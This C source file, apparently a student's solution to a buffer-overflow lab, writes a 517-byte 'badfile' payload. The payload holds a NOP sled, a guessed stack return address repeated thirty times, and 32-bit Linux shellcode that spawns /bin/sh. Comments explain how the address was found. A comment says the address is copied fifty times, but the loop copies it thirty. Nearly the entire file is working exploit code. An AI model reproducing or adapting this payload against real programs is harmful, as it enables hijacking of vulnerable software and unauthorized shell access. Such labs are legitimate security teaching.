/* exploit.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdq                            */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;




void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;
    char *ptr;
    long *long_ptr;
    long ret_addr = 0xbffff0e7+250;//I found the address by looking at the location of str when starting stack. Then I added 250 to make it go to the noops before reaching the shell code

    ptr=buffer;
    long_ptr = (long *) ptr;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);
    /* You need to fill the buffer with appropriate contents here */
    int i = 0;
    //Rather than guessing the location that the return address is on the stack, I copied it 50 times.
    for (i = 0; i < 30;i++)
        *(long_ptr++) = ret_addr;//move the pointer up one long each time

    //inject the shellcode to the end of the buffer
    for(i = 470;i < sizeof(shellcode) + 470;++i)
        buffer[i] = shellcode[i-470];
    buffer[sizeof(buffer) - 1] = '\0';//null terminator at the end

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}

